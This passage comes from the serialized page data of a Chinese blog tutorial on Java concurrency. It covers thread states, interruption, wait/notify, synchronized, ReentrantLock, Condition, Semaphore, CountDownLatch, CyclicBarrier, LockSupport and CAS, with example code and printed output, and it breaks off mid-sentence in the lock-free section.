谦让",charIndex:4940},{level:3,title:"ThreadGroup  线程组",slug:"threadgroup-线程组",normalizedTitle:"threadgroup  线程组",charIndex:null},{level:3,title:"setDaemon() 守护线程",slug:"setdaemon-守护线程",normalizedTitle:"setdaemon () 守护线程",charIndex:6746},{level:3,title:"setPriority() 线程优先级",slug:"setpriority-线程优先级",normalizedTitle:"setpriority () 线程优先级",charIndex:7196},{level:2,title:"三、volatile",slug:"三、volatile",normalizedTitle:"三、volatile",charIndex:7258},{level:2,title:"四、synchronized",slug:"四、synchronized",normalizedTitle:"四、synchronized",charIndex:7487},{level:2,title:"四、ReentrantLock 重入锁",slug:"四、reentrantlock-重入锁",normalizedTitle:"四、reentrantlock 重入锁",charIndex:10201},{level:3,title:"reentrantLock.lockInterruptibly() 中断处理",slug:"reentrantlock-lockinterruptibly-中断处理",normalizedTitle:"reentrantlock.lockinterruptibly () 中断处理",charIndex:10474},{level:3,title:"reentrantLock.tryLock() 锁申请等待限时",slug:"reentrantlock-trylock-锁申请等待限时",normalizedTitle:"reentrantlock.trylock () 锁申请等待限时",charIndex:10600},{level:3,title:"ReentrantLock(true) 公平锁",slug:"reentrantlock-true-公平锁",normalizedTitle:"reentrantlock (true) 公平锁",charIndex:10828},{level:3,title:"Condition 条件",slug:"condition-条件",normalizedTitle:"condition 条件",charIndex:11683},{level:2,title:"五、信号量 Semaphore",slug:"五、信号量-semaphore",normalizedTitle:"五、信号量 semaphore",charIndex:13273},{level:2,title:"六、ReetrantReadWriteLock 读写锁",slug:"六、reetrantreadwritelock-读写锁",normalizedTitle:"六、reetrantreadwritelock 读写锁",charIndex:14378},{level:2,title:"七、CountDownLatch 倒计时器",slug:"七、countdownlatch-倒计时器",normalizedTitle:"七、countdownlatch 倒计时器",charIndex:14627},{level:2,title:"八、CyclicBarrier 循环栅栏",slug:"八、cyclicbarrier-循环栅栏",normalizedTitle:"八、cyclicbarrier 循环栅栏",charIndex:16251},{level:2,title:"九、LockSupport 线程阻塞工具",slug:"九、locksupport-线程阻塞工具",normalizedTitle:"九、locksupport 线程阻塞工具",charIndex:17498},{level:2,title:"十、无锁",slug:"十、无锁",normalizedTitle:"十、无锁",charIndex:18720},{level:3,title:"AtomicInteger 无锁的系统安全整数",slug:"atomicinteger-无锁的系统安全整数",normalizedTitle:"atomicinteger 无锁的系统安全整数",charIndex:19440},{level:3,title:"AtomicReference 无锁对象引用 和 AtomicStampedReference 带有时间戳的对象引用",slug:"atomicreference-无锁对象引用-和-atomicstampedreference-带有时间戳的对象引用",normalizedTitle:"atomicreference 无锁对象引用 和 atomicstampedreference 带有时间戳的对象引用",charIndex:20420}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"一、基础感念 同步 和 异步 并发 和 并行 临界区 阻塞 和 非阻塞 死锁 饥饿 活锁 并发的级别 无饥饿 无障碍 无锁 无等待 原子性 可见性 有序性 二、线程 状态 suspend()暂停 resume()继续 stop() 强行终止线程 interrupt() isInterrupted()  interrupted() 中断线程 wait() notify() notifyAll() 等待和唤醒 join() 等待线程结束，yield() 谦让 ThreadGroup  线程组 setDaemon() 守护线程 setPriority() 线程优先级 三、volatile 四、synchronized 四、ReentrantLock 重入锁 reentrantLock.lockInterruptibly() 中断处理 reentrantLock.tryLock() 锁申请等待限时 ReentrantLock(true) 公平锁 Condition 条件 五、信号量 Semaphore 六、ReetrantReadWriteLock 读写锁 七、CountDownLatch 倒计时器 八、CyclicBarrier 循环栅栏 九、LockSupport 线程阻塞工具 十、无锁 AtomicInteger 无锁的系统安全整数 AtomicReference 无锁对象引用 和 AtomicStampedReference 带有时间戳的对象引用",content:'# 一、基础感念\n\n在了解锁之前，有很多的基础感念需要先理解以下，方便以后我们对各种情况的锁的问题，有更好的认识。\n\n\n# 同步 和 异步\n\n   同步就是多个任务一个一个执行，即你在学习的时候不可能会打游戏，打游戏的时候不可能在学习。\n   异步就是我洗衣服可以用洗衣机洗，边洗边打电话，而且打电话的同时还是能在做其他的事情，这个就是异步执行，但异步执行是一种，即做即完的\n\n\n# 并发 和 并行\n\n   并行 和 异步看似很像，但感念是完全不一样的。如果上述说异步是一个人可以做很多事情，那并行可以说多个人做不同的事情，即多个 CPU 处理不同的指令才能叫做并行，一个 CPU 处理多线程并不能称之为并行，而是并发。\n\n\n# 临界区\n\n   临界区用来表示一种公共资源或共享数据，可以被多个线程使用。但是每一次只能有一个线程使用它，一旦临界区资源被占用，其他线程要想使用这个资源，就必须等待。\n   在并行程序中，临界区资源是要被保护的对象，如果资源同时被两个线程操作，则会得到破坏。\n\n\n# 阻塞 和 非阻塞\n\n   阻塞是当临界资源被抢占，其他线程则需要在外等待资源释放，这种等待的过程称为阻塞。\n   非阻塞是不会受因为资源被抢占，而不去做其他事情。\n\n\n# 死锁 饥饿 活锁\n\n   死锁、饥饿、活锁都属于多线程活跃性问题。\n   死锁是一个严重的程序上设计出现的问题，当一个资源被占用，因程序的意外问题，导致资源无法被释放，则其他线程就一直等待造成的情况被称为死锁。\n   饥饿是指某一个或者多个线程因为种种原因无法获得所需的资源，导致一直无法执行。比如他的优先级可能太低，而高优先级的线程不断抢占它需要的资源，导致底优先级线程无法工作。\n   活锁是多个线程之间互相谦让而导致的，你让我我让你，或者说他们级别一样导致。\n\n\n# 并发的级别\n\n   由于临界区的存在，多线程之间的并发必须受到控制。根据控制并发的策略，我们可以把并发的级别进行分类，大致可以分为阻塞、无饥饿、无障碍、无锁、无等待几种。\n\n\n# 无饥饿\n\n   饥饿的产生是因为底优先级在临界区被高优先级的线程插队而导致一直无法获取资源 (也可以称未非公平锁)，解决饥饿就是让锁变得公平，要想获得资源，就必须乖乖排队，管你优先级高低，先到先得。\n\n\n# 无障碍\n\n   无障碍是一种最弱的非阻塞调度。两个线程如果是无障碍的执行，那么他们不会因为临界区的问题导致一方被挂起。也就是说大家都可以大摇大摆的进入临界区，那么如果一起修改共享数据，把数据修改坏了怎么办？对于无障碍的线程来说，一旦检测到这种情况，它就会立即对自己所作的的修改进行回滚，确保数据安全。但如果没有数据竞争发生，那么线程就可以顺利完成自己的工作，走出临界区。\n   如果说阻塞的控制方式是悲观策略。也就是说，系统认为两个线程之间很有可能发生不幸的冲突，因此，以保护共享数据为第一优先级。相对来说，非阻塞的调度就是一种乐观的策略。它认为多个线程之间很有可能不会发生冲突，或者说概率不大，因此大家都应该无障碍的执行，但是一旦检测到冲突，就应该回滚。\n   从这个策略中可以看到，无障碍的多线程程序不一定能顺畅的运行。因为当临界区中存在严重的冲突时，所有的线程都可能不断的回滚自己的操作，而没有一个线程可以走出临界区，这种情况会影响系统的正常执行。所以，我们可能会非常希望在这一堆线程中，至少可以有一个线程在有限的时间内完成自己的操作，而退出临界区。这样至少可以保证系统不会再临界区中无限的等待。\n   一种可行的无障碍实现可以依赖一个 “一致性标记” 来实现。线程在操作之前，先读取并保存这个标记，在操作完成后，再次读取，检查这个标记是否被更改过，如果说两者是一致的，则说明资源区没有冲突。如果不一致，则说明资源可能在操作过程中与其他写线程冲突，需要重试操作。而任何对资源有修改操作的线程，在修改数据前，都需要更新这个一致性标记，表示数据不再安全。\n\n\n# 无锁\n\n   无锁的并行都是无障碍的。在无锁的情况下，所有的线程都能尝试对临界区进行访问，但不同的是，无锁的并发保证必然有一个线程能够在有限时间内完成操作离开临界区。\n   在无锁的调用中，一个典型的特点是可能会包含一个去穷循环。在这个循环中，线程会不断尝试修改共享变量。如果没有冲突，修改成功，程序退出 ，否则继续尝试修改。但无论如何，无锁的并行总能保证有一个线程可以胜出的，不至于全军覆没。至于临界区中竞争失败的线程，他们则必须不断重试，直到自己胜利。如果运气不好，总是尝试不成功，则会出类似饥饿的现象，线程会停止不前。\n\n\n# 无等待\n\n   无锁只要求有一个线程可以在有限步内完成操作，而无等待则在无锁的基础上更进一步进行扩展。它要求所有的线程都必须在有限步内完成，这样就不会引起饥饿问题。如果再进行优化，还可以进一步分解为有限无等待和线程数无关的无等待几种，他们之前的区别只是对循环次数的限制不同。\n   一种典型的无等待结构就是 RCU (read-copy-update)。它的基本思想是，对数据的读可以不加控制。因此所有的读线程都是无等待的，它们既不会被锁定等待也不会引起任何冲突。但在写数据的时候，先取得原始数据的副本，接着只修改副本数据，修改完成后，在合适的时机回写数据。\n\n\n# 原子性\n\n   是指一个操作是不可被中断的，即使多个线程一起执行的时候，一个操作一旦开始，就不会被其他线程干扰。\n\n\n# 可见性\n\n   指当一个线程修改了共享变量的值，其他线程是否能够立即知道这个修改。\n\n\n# 有序性\n\n   有序性的问题是因为在程序执行时，可能会进行指令的重排，重排后的指令与原指令的顺序未必一致。(这种情况会出现在并发程序设计中)\n\n\n# 二、线程\n\n\n# 状态\n\nNEW 新建；\nRUNNABLE 可运行状态；\nBLOCKED 阻塞 (遇到 synchronized，直到获得锁)；\nWAITING 无时间的等待 (wait (),notify ())；\nTIMED_WAITING 有时间的等待；\nTERMINATED 结束。\n\n\n# suspend () 暂停 resume () 继续\n\n   字面意思，但 suspend () 不会释放锁，必须调用 resume () 才能释放锁，但是如果意外的 resume () 比 suspend () 提前执行，则其他线程永远等待，变为死锁。\n\n\n# stop () 强行终止线程\n\n   Thread.stop (); 强行终止线程，会导致数据不一致，破坏数据。\n\n\n# interrupt () isInterrupted () interrupted () 中断线程\n\n   Thread.interrupt () 中断线程，也就是设置中断标志位。Thread.isInterrupted () 判断当前线程是否被中断。 Thread.interrupted () 也是用来判断当前线程的中断状态。如果在线程中使用了 Thread.sleep ()，那么要中断一个线程必须也在 Thread.sleep () 的 catch 语句中 在执行一次当前线程的中断。\n\n> Thread.sleep () 方法由于中断而抛出异常，此时，他会清除中断标志，如果不加处理，那么在下次执行线程时，就无法判断这个中断标志，会继续执行线程，并不会达到中断线程。\n> 中断是不会释放锁的。\n\n    public static void main(String[] args) throws InterruptedException {\n        String a = "1";\n        Thread[] threads = new Thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new Thread(() -> {\n                while (true) {\n                    synchronized (a) {\n                        try {\n                            System.out.println("线程启动 " + b);\n                            if (Thread.currentThread().isInterrupted()) {\n                                System.out.println("线程中断" + b);\n                                break;\n                            }\n                            Thread.sleep(5000);\n                            System.out.println("执行完毕 " + b);\n                        } catch (InterruptedException e) {\n                            System.out.println("老子被中断了 " + b);\n                            // 这里必须在中断一次，否则\n                            Thread.currentThread().interrupt();\n                        }\n                    }\n                }\n            });\n        }\n        threads[0].start();\n        Thread.sleep(2000);\n        threads[0].interrupt();\n        threads[1].start();\n    }\n输出结果：\n线程启动 0\n老子被中断了 0\n线程启动 0\n线程中断0\n线程启动 1\n执行完毕 1\n线程启动 1\n执行完毕 1\n线程启动 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n\n\n\n# wait () notify () notifyAll () 等待和唤醒\n\n   如果一个线程调用了 object.wait ()，那么它就会进入 object 对象的等待队列，这个等待队列中可能会有多个线程，因为系统运行多个线程同时等待某一个对象。当 object.notify () 被调用时，它就会从这个等待队列中，随机选择一个线程，并将其唤醒。需要大家注意的是这个选择是不公平的，并不是先等待的线程会优先被选择，这个选择完全是随机的。object.notifyAll () 它和 notify () 的功能基本一致，但不同的是，它会唤醒在这个等待队列中所有等待的线程，而不是随机选择一个。\n   object.wait () 和 object.notify () 必须在对应的 synchronized 语句中，需要首先获得目标对象的一个监视器。\n\n> wait () 方法只会释放当前对象的锁，不会释放所有锁。\n> notify () 不会立刻立刻释放 sycronized（obj）中的 obj 锁，必须要等 notify () 所在线程执行完容 synchronized（obj）块中的所有代码才会释放这把锁。\n\n\n# join () 等待线程结束，yield () 谦让\n\n    public volatile static int i = 0;\n\n    public static void main(String[] args) throws InterruptedException {\n        Thread thread = new Thread(() -> {\n            for(i=0;i<100000;i++);\n        });\n        thread.start();\n        thread.join();\n        System.out.println(i);\n    }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n\n\n\n   join () 会一直阻塞线程直到目标线程执行完毕。如果不使用 join () 等待 thread，那么得到的 i 很可能是 0 或者一个非常小的数字。因为 thread 还没开始执行，i 的值就已经被输出了。\n   yield () 会使当前线程让出 CPU。但让出 CPU 并不代表当前线程不执行了。当前线程让出 CPU 后，会进行 CPU 资源的争夺，但是否能够再次被分配，就不一定了。如果你觉得一个线程不那么重要，或者优先级非常低，而且又害怕它会占用太多的 CPU 资源，那么可以在适当的时候调用 yield () ，给予其他重要线程更多的工作机会。\n\n> yield 不会释放锁，需执行完毕\n\n\n# ThreadGroup 线程组\n\n    public static void main(String[] args) throws InterruptedException {\n        ThreadGroup threadGroup = new ThreadGroup("订单组");\n        Thread t1 = new Thread(threadGroup,() -> {\n            String name = Thread.currentThread().getName();\n            try {\n                Thread.sleep(5000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println("当前线程名称 :" + name);\n        },"下单");\n        Thread t2 = new Thread(threadGroup,() -> {\n            String name = Thread.currentThread().getName();\n            try {\n                Thread.sleep(5000);\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n            System.out.println("当前线程名称 :" + name);\n        },"取消订单");\n        t1.start();\n        t2.start();\n        System.out.println(threadGroup.activeCount());\n        threadGroup.list();\n    }\n\n结果：\n2\njava.lang.ThreadGroup[name=订单组,maxpri=10]\n    Thread[下单,5,订单组]\n    Thread[取消订单,5,订单组]\n当前线程名称 :取消订单\n当前线程名称 :下单\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# setDaemon () 守护线程\n\n   守护线程是一种特殊的线程，就和他的名字一样，它是系统的守护者，在后台默默的完成一些系统的任务，比如垃圾回收线程、JIT 线程就可以理解为守护线程。与之相对应的是用户线程，用户线程可以认为是系统的工作线程，它会完成这个程序应该要完成的业务操作。如果用户线程全部结束，这也意味着这个程序实际上无事可做。守护线程要守护的对象已经不存在了，那么整个应用程序就自然应该结束。因此，当一个 java 应用内，只有守护线程时，java 虚拟机就会自然退出。\n\n        t1.setDaemon(true);\n        t2.setDaemon(true);\n        t1.start();\n        t2.start();\n\n\n1\n2\n3\n4\n\n\n   设置守护线程必须在 start () 之前设置。如果上述例子两个都是守护线程，则不会等到线程里打印结果，程序直接结束。用户线程的话，会等到线程以上两个线程执行完成，再主线程结束。\n\n\n# setPriority () 线程优先级\n\n   java 中，使用 1-10 表示线程优先级，数字越大则越优先。\n\n\n# 三、volatile\n\n    当你用 volatile 去申明一个变量时，就等于告诉了虚拟机，这个变量极有可能会被某些程序或者线程修改。为了确保这个变量被修改后，应用程序范围内的所有线程都能够 "看到" 这个改动，虚拟机就必须采用一些特殊的手段，保证这个变量的可见性、有序性、原子性。\n   volatile 对于保证操作的原子性是有非常大的帮助的。但是需要注意的是，volatile 并不能代替锁，他也无法保证一些复合操作的原子性。比如 i++\n\n\n# 四、synchronized\n\n    synchronized 的作用是实现线程间的同步。它的工作是对同步的代码加锁，使得每一次只能有一个线程进入同步块，从而保证线程间的安全性。\n\n * 指定加锁对象：对给定的对象加锁，进入同步代码前要获得给定对象的锁，且要保证每个线程里的 synchronized (对象) 的对象参数是同一个实例。\n * 直接作用于实例方法：相当于对当前实例加锁，进入同步代码前要获得当前实例的锁。若两个线程不是同一个实例，则锁失败。\n * 直接作用于静态方法：相当于对当前类加锁，进入同步代码前要获得当前类的锁。\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = "aaa";\n        String b = "aaa";\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n200000\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = "aaa";\n        String b = "bbb";\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n112775\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n    public static int i = 0;\n    public static void main(String[] args) throws InterruptedException {\n        String a = new String("aaa");\n        String b = new String("aaa");\n        Thread t1 = new Thread(() -> {\n            for(int j=0;j<100000;j++){\n                synchronized (a){\n                    add();\n                }\n            }\n        });\n        Thread t2 = new Thread(() ->  {\n            for(int j=0;j<100000;j++){\n                synchronized (b){\n                    add();\n                }\n            }\n        });\n        t1.start();\n        t2.start();\n        t1.join();\n        t2.join();\n        System.out.println(i);\n        System.out.println(a);\n        System.out.println(b);\n    }\n    public static void add(){\n        i++;\n    }\n结果：\n106451\naaa\naaa\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n\n# 四、ReentrantLock 重入锁\n\n  当线程请求一个由其它线程持有的对象锁时，该线程会阻塞，而当线程请求由自己持有的对象锁时，如果该锁是重入锁，请求就会成功，否则阻塞。特别注意，若一个线程多次获得锁，那么在释放所得时候，也必须释放相同次数。\n   synchronized 也是重入锁，当一个类里的 A、B、C 三个方法都被加上 synchronized 则 A 调用 B，B 调用 C 会依次正确调用执行，如果 synchronized 不是重入锁，则这种调用方式会被 成为死锁，因为 A B C 三个方法持有的是同一个实例。\n\n\n# reentrantLock.lockInterruptibly () 中断处理\n\n   在等待锁的过程中，程序可以根据需要取消对锁的申请。lockInterruptibly () 对中断进行响应的锁申请动作，即在等待锁的过程中，可以响应中断。\n\n\n# reentrantLock.tryLock () 锁申请等待限时\n\n   tryLock () 有两种方法\n\n * reentrantLock.tryLock (5, TimeUnit.SECONDS); 如果锁被其他线程占用则等待 5 秒，超过 5 秒没有得到锁，就会返回 false，成功得到锁则返回 true。\n * reentrantLock.tryLock (); 如果锁被其他线程占用则直接返回 false，得到锁则直接返回 true\n\n\n# ReentrantLock (true) 公平锁\n\n   在大多情况下锁都是非公平的。也就是说，线程 1 和 线程 2 同时请求了锁 A，那么当锁 A 可用时，是线程 1 可以获得锁还是线程 2 可以获得锁呢？这是不一定的，系统只是会从这个锁的等待队列种随机挑选一个。\n   当 new ReentrantLock (true) 表示是公平的。但要实现一个公平锁，必然要求系统维护一个有序队列，因此公平锁的实现成本比较高了，如果没有特别的需要，也不需要使用公平锁。\n\n> reentrantLock.lock (); 获得锁，如果锁被占用则等待；\n> reentrantLock.tryLock (); 线程尝试获取锁，如果获取成功，则返回 true，如果获取失败（即锁已被其他线程获取），则返回 false\n> reentrantLock.tryLock (long timeout，TimeUnit unit); 线程如果在指定等待时间内获得了锁，就返回 true，否则返回 false\n> reentrantLock.unlock (); 释放锁\n> reentrantLock.isHeldByCurrentThread () 当前线程是否持有该锁\n> reentrantLock.lockInterruptibly () 获得锁，但有线响应中断\n> reentrantLock.getHoldCount (); 当前线程调用 lock () 方法的次数\n> reentrantLock.getQueueLength (); 当前正在等待获取 Lock 锁的线程的估计数\n> reentrantLock.getWaitQueueLength (Condition condition); 当前正在等待状态的线程的估计数，需要传入 Condition 对象\n> reentrantLock.hasWaiters (Condition condition); 查询是否有线程正在等待与 Lock 锁有关的 Condition 条件\n> reentrantLock.hasQueuedThread (Thread thread); 查询指定的线程是否正在等待获取 Lock 锁\n> reentrantLock.hasQueuedThreads (); 查询是否有线程正在等待获取此锁定\n> reentrantLock.isFair (); 判断当前 Lock 锁是不是公平锁\n> reentrantLock.hasQueuedThread (Thread thread); 查询指定的线程是否正在等待获取 Lock 锁\n> reentrantLock.hasQueuedThread (Thread thread); 查询指定的线程是否正在等待获取 Lock 锁\n> reentrantLock.hasQueuedThread (Thread thread); 查询指定的线程是否正在等待获取 Lock 锁\n\n\n# Condition 条件\n\n    public static void main(String[] args) throws InterruptedException {\n        ReentrantLock lock = new ReentrantLock();\n        Condition condition = lock.newCondition();\n        new Thread(() -> {\n            try{\n                System.out.println("进入测试");\n                lock.lock();\n                System.out.println("获取锁");\n                condition.await();\n                System.out.println("等待结束");\n                Thread.sleep(5000);\n                System.out.println("这是对我的一次测试");\n            }catch(Exception e){\n                lock.unlock();\n            }\n        }).start();\n        Thread.sleep(3000);\n        System.out.println("等待三秒结束");\n        lock.lock();\n        condition.signal();\n        lock.unlock();\n    }\n结果：\n进入测试\n获取锁\n等待三秒结束\n等待结束\n这是对我的一次测试\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n\n\n   和 Object 里 waite () notify () 一样，当线程使用 condition.await () 时，要求线程持有相关的重入锁，在 condition.await () 调用后，这个线程会释放这把锁。同理，在 condition.signal () 方法调用时，也要求线程先获得相关锁，在 condition.signal () 方法调用后，系统会从当前 Condition 对象的等待队列中，唤醒一个线程，一旦线程唤醒，它会重新尝试获得与之绑定的重入锁，一旦成功获取，就可以继续执行。因此，在 condition.signal () 方法调用后，一般需要释放相关的锁，让给被唤醒的线程，让它继续执行。\n\n\n# 五、信号量 Semaphore\n\n   信号量为多线程写作提供更为强大的控制方法。广义上讲，信号量是对锁的扩展。无论是内部 synchronized 还是 ReentrantLock，一次都只允许一个线程访问一个资源，而信号量却可以指定多个线程，同时访问摸一个资源。在构造信号量对象时，必须要指定信号量的准入数，即同时能申请多少个许可。\n\nSemaphore semaphore = new Semaphore(3);\nSemaphore semaphore1 = new Semaphore(3,true); // 第二个参数指定是否公平\n\n\n1\n2\n\n * acquire () 尝试获得一个准入许可。若无法获得，则线程会等待，直到有线程释放一个许可或者当前线程被中断。\n * acquireUninterruptibly () 和 acquire () 类似，但不会响应中断。\n * tryAcquire () 尝试获得一个许可，成功返回 true，失败返回 false。\n * release () 在线程访问资源结束后，释放一个许可，以使其他等待许可的线程可以进行资源访问。\n\n    public static void main(String[] args) throws InterruptedException {\n        Semaphore semaphore = new Semaphore(3);\n        for(int i=0;i<20;i++){\n            new Thread(() -> {\n                try {\n                    semaphore.acquire();\n                    Thread.sleep(2000);\n                    System.out.println("结束 -> "+ Thread.currentThread().getId());\n                    semaphore.release();\n                }catch (Exception e){\n\n                }\n            }).start();\n        }\n    }\n结果：\n结束 -> 13\n结束 -> 14\n结束 -> 12\n结束 -> 15\n...\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n\n# 六、ReetrantReadWriteLock 读写锁\n\n   ReetrantReadWriteLock 实现了 ReadWriteLock 接口，ReadWriteLock 管理一组锁，一个是只读的锁，一个是写锁。\n\n * ReetrantReadWriteLock 支持获取锁顺序，非公平模式（默认），公平模式\n * ReetrantReadWriteLock 支持可重入\n * ReetrantReadWriteLock 支持锁降级，可以从写锁降级到读锁，但不能从读锁升级到写锁。\n\n\n# 七、CountDownLatch 倒计时器\n\n    public static void main(String[] args) throws InterruptedException {\n        CountDownLatch countDownLatch = new CountDownLatch(10);\n        for(int i = 0;i<5;i++){\n            int b = i;\n            new Thread(() -> {\n                System.out.println("i 已准备 = "+ b);\n                countDownLatch.countDown();\n            }).start();\n        }\n        // 等待装载完毕\n        countDownLatch.await();\n        System.out.println("结束");\n    }\n结果:\ni 已准备 = 0\ni 已准备 = 1\ni 已准备 = 2\ni 已准备 = 3\ni 已准备 = 4\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n   为什么没有输出 "结束"，是因为我们给 CountDownLatch 的任务为 10 个，但是循环只有 5 个任务，所以在 countDownLatch.await (); 会一直等待装载够才会继续执行，所以阻塞在那里。如果循环大小比 CountDownLatch 的任务大，则一旦装载够，则会立马继续执行。countDownLatch.countDown () 告诉 CountDownLatch 实例，已近准备好一个。\n\n   public static void main(String[] args) throws InterruptedException {\n        CountDownLatch countDownLatch = new CountDownLatch(10);\n        for(int i = 0;i<12;i++){\n            int b = i;\n            new Thread(() -> {\n                countDownLatch.countDown();\n                try {\n                    Thread.sleep(5000);\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                }\n                System.out.println("i 已准备 = "+ b);\n            }).start();\n        }\n        // 等待装载完毕\n        countDownLatch.await();\n        System.out.println("结束");\n    }\n结果：\n结束\ni 已准备 = 0\ni 已准备 = 11\ni 已准备 = 6\ni 已准备 = 1\ni 已准备 = 8\ni 已准备 = 5\ni 已准备 = 9\ni 已准备 = 2\ni 已准备 = 3\ni 已准备 = 10\ni 已准备 = 4\ni 已准备 = 7\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 八、CyclicBarrier 循环栅栏\n\n   这货比 CountDownLatch 牛逼一点的就是，我集齐 7 棵龙珠，许了愿，还可以再等集齐 7 棵龙珠，再许愿。只要我集齐 1 颗就必须等 7 棵全部集齐，否则一直等待。但召唤神龙也是会有上限的，什么时候才能彻底结束呢？就是你在 CyclicBarrier 构造函数传入 7，一旦集齐 7 棵那就结束了。\n\n    public static void main(String[] args) throws InterruptedException {\n        int parties = 7;\n        CyclicBarrier cyclicBarrier = new CyclicBarrier(parties);\n        for(int i = 0;i<8;i++){\n            int b = i;\n            if(b%parties ==0) {\n                Thread.sleep(2000);\n            }\n            new Thread(() -> {\n                System.out.println("已集齐 "+ (b%parties +1));\n                try {\n                    cyclicBarrier.await();\n                    if(b%parties ==0) {\n                        System.out.println("召唤神龙");\n                    }\n                } catch (InterruptedException e) {\n                    e.printStackTrace();\n                } catch (BrokenBarrierException e) {\n                    e.printStackTrace();\n                }\n            }).start();\n        }\n    }\n结论是：\n已集齐 1\n已集齐 2\n已集齐 3\n已集齐 7\n已集齐 5\n已集齐 6\n已集齐 4\n召唤神龙\n已集齐 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n   不要在乎以上结果的顺序，可以看到它已经集齐了 7 棵龙珠，召唤了神龙，但是召唤完了之后又在去集齐，这样就造成了等待，势必要再次集齐召唤神龙，且召唤了之后不再去集齐了，才能结束进程。\n\n\n# 九、LockSupport 线程阻塞工具\n\n   LockSupport 是一个非常方便实用线程阻塞工具，它可以在线程内任意位置让线程阻塞。和 Thread.suspend () 相比，它弥补了由于 resume () 在前发生，导致线程无法继续执行的情况。和 Object.wait () 相比，它不需要先获得某个对象锁，也不会抛出 中断异常，中断异常可以在线程中获取 Thread.currentThread ().isInterrupted () 来得知。\n\n    public static void main(String[] args) throws InterruptedException {\n        String a = "1";\n        Thread[] threads = new Thread[2];\n        for(int i=0;i<2;i++){\n            int b = i;\n            threads[i] = new Thread(() -> {\n                try {\n                    System.out.println("线程启动 " + b);\n//                  提前使用解锁\n                    LockSupport.unpark(Thread.currentThread());\n                    LockSupport.park();\n                    Thread.sleep(3000);\n                    System.out.println("执行完毕 " + b);\n                } catch (Exception e) {\n                    System.out.println("老子被中断了 " + b);\n                    // 这里必须在中断一次，否则\n                    Thread.currentThread().interrupt();\n                }\n            });\n        }\n        threads[0].start();\n//        LockSupport.unpark(threads[0]);\n        threads[1].start();\n    }\n输出结果：\n线程启动 0\n执行完毕 0\n线程启动 1\n执行完毕 1\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# 十、无锁\n\n   对于并发控制而言，锁是一种悲观策略。它总是假设每一次的临界区操作会产生冲突，因此，必须对每次操作都小心翼翼。如果有多个线程同时访问临界区资源，就宁可牺牲让线程等待，所以说锁会阻塞线程执行。而无锁是一种乐观的策略，它会假设对资源的访问没有冲突的。既然没有冲突，自然不需要等待，所以所有的线程都可以在不停顿的状态下持续执行。那遇到冲突怎么办？无锁的策略使用一种叫做比较交换的技术 (CAS compare and Swap) 来鉴别线程冲突，一旦检测到冲突产生，就重试当前操作直到没有冲突位置。\n   与锁相比，使用比较交换 (CAS) 会使程序看起来更加复杂一些。但由于其非阻塞性，它对死锁问题天生免疫，并且，线程间的相互影响也远远比基于锁的方式要小。更为重要的是，使用无锁的方式完全没有锁竞争带来的系统开销，也没有线程间频繁调度带来的开销，因此，它要比基于锁的方式拥有更优越的性能。\n   CAS 的算法过程是这样的：它包含三个参数 CAS (V,E,N)。V 表示要更新的变量，E 表示预期值，N 表示新值。仅当 V 值等于 E 值时，才会将 V 的值设为 N，如果 V 值和 E 值不同，则说明已经有其他线程做了更新，则当前线程什么都不做。最后，CAS 返回当前 